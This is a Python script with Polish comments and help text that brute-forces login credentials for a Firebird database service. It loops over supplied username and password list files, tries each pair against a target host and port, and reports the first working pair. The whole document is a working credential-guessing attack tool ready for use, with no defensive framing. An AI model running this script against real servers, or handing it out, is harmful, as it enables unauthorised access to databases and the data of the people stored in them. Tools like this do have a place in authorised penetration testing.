#!/usr/bin/env python3
import argparse
import sys
import firebirdsql

print("Remember that this database is old and therefore slow. This won't be the fastest brute force you've ever seen.")

def try_credentials(host: str, port: int, user: str, password: str, timeout: int) -> bool:
    """Próbuje połączyć się do usługi Firebird z podanymi poświadczeniami."""
    try:
        svc = firebirdsql.services.connect(
            host=host, port=port,
            user=user, password=password,
            timeout=timeout
        )
        svc.close()
        return True
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Brute-force login i hasła do usługi Firebird"
    )
    parser.add_argument("-i", "-host", "-ip", dest="ipAddr", required=True, help="Adres IP lub nazwa hosta serwera Firebird")
    parser.add_argument("-port", type=int, default=3050, help="Port usługi (domyślnie 3050)")
    parser.add_argument("-u", "--users", required=True, help="Plik z listą loginów (jedna nazwa na linię)")
    parser.add_argument("-p", "--passwords", required=True, help="Plik z listą haseł (jedno hasło na linię)")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout połączenia w sekundach")
    args = parser.parse_args()

    try:
        with open(args.users, encoding="utf-8") as f:
            users = [u.strip() for u in f if u.strip()]
    except Exception as e:
        print(f"Nie mogę odczytać pliku z loginami: {e}")
        sys.exit(1)

    try:
        with open(args.passwords, encoding="utf-8") as f:
            passwords = [p.strip() for p in f if p.strip()]
    except Exception as e:
        print(f"Nie mogę odczytać pliku z hasłami: {e}")
        sys.exit(1)

    print(f"Start brute–force na {args.ipAddr}:{args.port}")
    for user in users:
        for pwd in passwords:
            sys.stdout.write(f"\rTestuję {user}:{pwd}... ")
            sys.stdout.flush()
            if try_credentials(args.ipAddr, args.port, user, pwd, args.timeout):
                print(f"\n[OK] Znaleziono poświadczenia: {user}:{pwd}")
                sys.exit(0)
    print("\nNie znaleziono poprawnych poświadczeń.")
    sys.exit(1)

if __name__ == "__main__":
    main()
